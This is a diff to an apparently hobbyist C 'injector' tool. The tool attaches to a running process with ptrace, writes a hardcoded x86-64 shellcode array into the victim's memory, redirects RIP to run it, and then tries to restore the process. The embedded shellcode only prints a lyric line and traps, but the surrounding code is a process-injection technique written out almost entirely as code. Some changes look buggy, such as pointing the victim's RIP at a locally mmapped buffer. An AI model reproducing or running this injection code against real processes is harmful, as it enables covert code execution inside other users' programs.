@@ -56,6 +56,7 @@
 #include "Harklerror.h"						// HARKLE_ERROR
 #include "Harkleproc.h"						// is_it_a_PID(), make_PID_into_proc()
 #include "Memoroad.h"						// release_a_string()
+#include <sys/mman.h>						// mmap()
 #include "pmparser.h"						// pmStruct_ptr
 #include <stdbool.h>						// bool, true, false
 #include <stdio.h>							// fprintf()
@@ -81,6 +82,12 @@ int main(int argc, char* argv[])
 	struct iovec* localBackup = NULL;  // Local backup of the PIDs executable memory map
 	char* payloadFilename = NULL;  // Store the payload absolute or relative filename here
 	char* payloadContents = NULL;  // Store the contents of the payload here
+	int tempRetVal = 0;  // Store int return values here
+	char code[] = { 0xEB, 0x11, 0x48, 0x31, 0xC0, 0xB0, 0x01, 0x48, 0x89, 0xC7, 0x5E, 0x48, 0x31, 0xD2, 0xB2, 0x29, \
+	                0x0F, 0x05, 0xCC, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF, 0x54, 0x68, 0x61, 0x74, 0x20, 0x77, 0x65, 0x61, \
+	                0x76, 0x65, 0x20, 0x67, 0x6F, 0x74, 0x74, 0x61, 0x20, 0x67, 0x6F, 0x2E, 0x20, 0x50, 0x69, 0x6E, \
+	                0x6B, 0x20, 0x73, 0x6C, 0x69, 0x70, 0x2E, 0x20, 0x2D, 0x43, 0x61, 0x72, 0x64, 0x69, 0x20, 0x42, \
+	                0x0A, 0x00 };
 
 	// INPUT VALIDATION
 	// procPIDStructs
@@ -169,6 +176,7 @@ int main(int argc, char* argv[])
 			else
 			{
 				fprintf(stdout, "[*] Attched to PID\n");  // DEBUGGING
+				// getchar();  // DEBUGGING
 			}
 		}
 	}
@@ -206,15 +214,24 @@ int main(int argc, char* argv[])
 		else
 		{
 			tmpPM_ptr = procMaps_ptr;
-
+			tempRetVal = 0;  // TEST OTHER MEMORY SECTIONS
 			while (tmpPM_ptr)
 			{
-				if (1 == tmpPM_ptr->is_x)
+				if (1 == tmpPM_ptr->is_w)
+				// if (1 == tmpPM_ptr->is_x)
 				{
-					// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
-					// fprintf(stdout, "\n");  // DEBUGGING
-				    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
-					break;  // Found one
+					if (!tempRetVal)
+					{
+						// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
+						// fprintf(stdout, "\n");  // DEBUGGING
+						fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
+					    // fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
+						break;  // Found one
+					}
+					else
+					{
+						tempRetVal--;
+					}
 				}
 
 				tmpPM_ptr = tmpPM_ptr->next;
@@ -275,7 +292,8 @@ int main(int argc, char* argv[])
 
 			// 6.2. Read the payload in
 			// payloadContents = fread_a_file(payloadFilename);
-			payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
+			// payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
+			payloadContents = code;
 			
 			if (!payloadContents)
 			{
@@ -284,28 +302,61 @@ int main(int argc, char* argv[])
 			}
 			else
 			{
-				// 6.3. Write the payload to memory
-				if (copy_local_to_remote(vicPID->pidNum, \
-										 tmpPM_ptr->addr_start, \
-										 payloadContents, \
-										 strlen(payloadContents)))
+				// 6.3. Change the permissions on the memory
+				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+				// 	                          MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
+
+				// getchar();  // DEBUGGING
+				if (tempRetVal)
 				{
-					HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+					HARKLE_ERROR(injector, main, change_mmap_prot failed);
+					fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
 					success = false;
 				}
 				else
 				{
-					fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
+					// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
+					fprintf(stdout, "[*] Modified mapped memory permissions\n");  // DEBUGGING
+					// getchar();  // DEBUGGING
+					// 6.4. Write the payload to memory
+					// if (copy_local_to_remote(vicPID->pidNum, \
+					// 						 tmpPM_ptr->addr_start, \
+					// 						 payloadContents, \
+					// 						 strlen(payloadContents)))
+					if (copy_local_to_remote(vicPID->pidNum, \
+											 tmpPM_ptr->addr_start, \
+											 payloadContents, \
+											 sizeof(code)/sizeof(*code)))
+					{
+						HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+						success = false;
+					}
+					else
+					{
+						fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
+					}
 				}
 			}
 		}
+	}
+
+	// DEBUGGING
+	void *buf;
+	if (true == success)
+	{
+		buf = mmap(0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,
+                   MAP_PRIVATE|MAP_ANON,-1,0);
+    	memcpy(buf, code, sizeof(code));
+    	// fprintf(stdout, "Writing:\t%s", (char*)buf);  // DEBUGGING
 	}
 
 	// 6. Update RIP to point to the injected code
 	if (true == success)
 	{
 		// 6.1. Modify existing registers to reflect the new RIP
-		newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
+		newRegs.rip = (unsigned long long)buf;
+		// newRegs.rip = (unsigned long long)code;
+		// newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
 		
 		// 6.2. Update the victim PID's process registers
 		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &newRegs);
@@ -322,6 +373,7 @@ int main(int argc, char* argv[])
 			fprintf(stdout, "[*] Successfully updated RIP\n");  // DEBUGGING
 		}
 	}
+	// getchar();  // DEBUGGING
 
 	// 7. Resume execution
 	if (true == success)
@@ -340,6 +392,7 @@ int main(int argc, char* argv[])
 			fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
 		}
 	}
+	// getchar();  // DEBUGGING
 
 	// 8. Wait until the injected code finishes running and hits a SIGTRAP
 	if (true == success)
@@ -362,10 +415,11 @@ int main(int argc, char* argv[])
 			else
 			{
 				HARKLE_ERROR(injector, main, SIGTRAP not found);
-				success = false;
+				// success = false;
 			}
 		}
 	}
+	// getchar();  // DEBUGGING
 
 	// 9. Restore the process back to its original state
 	if (true == success)
@@ -384,6 +438,7 @@ int main(int argc, char* argv[])
 		{
 			fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
 		}
+		// getchar();  // DEBUGGING
 		
 		// 9.2. Restore the mapped memory
 		if (copy_local_to_remote(vicPID->pidNum, \
@@ -398,6 +453,7 @@ int main(int argc, char* argv[])
 		{
 			fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
 		}
+		// getchar();  // DEBUGGING
 		
 		// 9.3. Detack from the process to resume execution
 		ptRetVal = ptrace(PTRACE_DETACH, vicPID->pidNum, NULL, NULL);
@@ -413,7 +469,9 @@ int main(int argc, char* argv[])
 		{
 			fprintf(stdout, "[*] PID detached\n");  // DEBUGGING
 		}
+		// getchar();  // DEBUGGING
 	}
+	// getchar();  // DEBUGGING
 
 	// CLEAN UP
 	// 1. procPIDStructs
@@ -461,13 +519,13 @@ int main(int argc, char* argv[])
 	}
 	
 	// 6. payloadContents
-	if (payloadContents)
-	{
-		if (false == release_a_string(&payloadContents))
-		{
-			HARKLE_ERROR(injector, main, release_a_string failed);
-		}
-	}
+	// if (payloadContents)
+	// {
+	// 	if (false == release_a_string(&payloadContents))
+	// 	{
+	// 		HARKLE_ERROR(injector, main, release_a_string failed);
+	// 	}
+	// }
 
 	// DONE
 	return 0;
